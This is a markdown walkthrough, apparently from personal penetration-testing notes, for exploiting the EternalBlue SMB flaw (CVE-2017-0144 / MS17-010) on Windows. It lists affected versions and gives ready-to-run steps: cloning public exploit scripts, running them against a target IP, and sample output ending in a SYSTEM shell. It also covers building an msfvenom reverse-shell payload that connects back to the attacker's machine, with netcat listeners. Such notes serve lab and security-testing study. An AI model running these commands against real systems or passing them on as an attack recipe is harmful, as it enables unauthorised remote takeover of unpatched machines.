| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
| CVE-2017-0144 / MS17-010 | Windows SMB Remote Code Execution (Eternalblue) | win_server_2008 sp_1 arc_x64,win_7 version_1511 arc_x64,win_server_2016 arc_x64,win_7 version_1607 arc_x86,win_server_2008 sp_2 arc_x64,win_server_2008 sp_2 arc_x86,win_7 arc_x64,win_vista sp_2 arc_x86,win_8.1 arc_x86,win_10 sp_1 arc_x64,win_server_2008 sp_1 arc_x86,win_10 sp_1 arc_x86,win_vista sp_2 arc_x64,win_7 version_1607 arc_x64,win_7 arc_x86,win_8.1 arc_x64,win_7 version_1511 arc_x86,win_server_2012 arc_x86 |

<br><br>


Git clone the following git repository :

```sh
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

<br>There are 4 Scripts on that repository for different versions of Windows :<br>

* zzz_exploit.py - this one will directly spawn SYSTEM shell, no need to generate payload. **[Use this first]**
* eternalblue_exploit7.py - Win 7 SP1 x64, Win 2008 R2 SP1 x64, Win 7 SP1 x86, Win 2008 SP1 x64, Win 2008 SP1 x86
* eternalblue_exploit8.py - Win 2012 R2 x64, Win 8.1 x64, Win 10 Pro Build 10240 x64
* eternalblue_exploit10.py - Win 2012 R2 x64, Win 8.1 x64, Win 10 Pro Build 10240 x64

### # zzz_exploit.py

This should work on all targets. Just launch with target IP:

```sh
$ python zzz_exploit.py <TARGET-IP>
# output
[*] Target OS: Windows 8.1 Enterprise 9600
[+] Found pipe 'netlogon'
[+] Using named pipe: netlogon
[*] Target is 64 bit
Got frag size: 0x20
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xf90
CONNECTION: 0xffffe00002935020
SESSION: 0xffffc000041ee050
FLINK: 0xffffc0000700e098
InParam: 0xffffc0000700816c
MID: 0x503
[+] success controlling groom transaction
[*] modify trans1 struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[*] overwriting session security context
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

This version reuses same connection to execute commands. Remember the shell is not interactive.

### # eternalblue_exploit[7/8/10].py

First to prepare exploit payload 

```sh
cd shellcode && ./shell_prep.sh 
```
the script will prepare payload for both 32-bit and 64-bit Windows and ask for two listener ports to generate the payload.<br>
Fillup necessary informations asked by the script. It will generate the payload file as **sc_all.bin** <br>
Next start two netcat listeners on the port numbers chosen in the last step in different terminals.

<br>NOTE : you need a valid user account to exploit Windows 10 Build 10240 and Windows 2012 R2, they are more like a privesc than RCE. you need to add username password by editing those scripts.<br>
My target was a windows 7 x64 so I used the eternalblue_exploit7.py

```sh
python eternalblue_exploit7.py <TARGET-IP> shellcode/sc_all.bin
```

The payload is compatible for both 32-bit and 64-bit Windows so even if you initially don't know the correct edition it will send reverse shell on one of the netcat listeners.



# For Windows XP, Server 2000 :

First download these two Python2 scripts

* [send_and_execute.py](https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py)
* [mysmb.py](https://raw.githubusercontent.com/helviojunior/MS17-010/master/mysmb.py)<br>

These script require `impacket, pycrypto`. They are installed by default in Kali but if you don't have it already then install with :

```sh
pip install pycrypto
git clone https://github.com/CoreSecurity/impacket.git
cd impacket && pip install .
```

Next create a binary reverse_shell payload using msfvenom:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR-MACHINE-IP> LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_shell.exe
```
Next start a netcat listener on the port you specified on your msfvenom payload and leave it running.<br>
Now all that's left is to run the script:

```sh
python send_and_execute.py <TARGET-IP> rev_shell.exe
```

In a couple of seconds a reverse shell should arrive as System on your netcat listener.

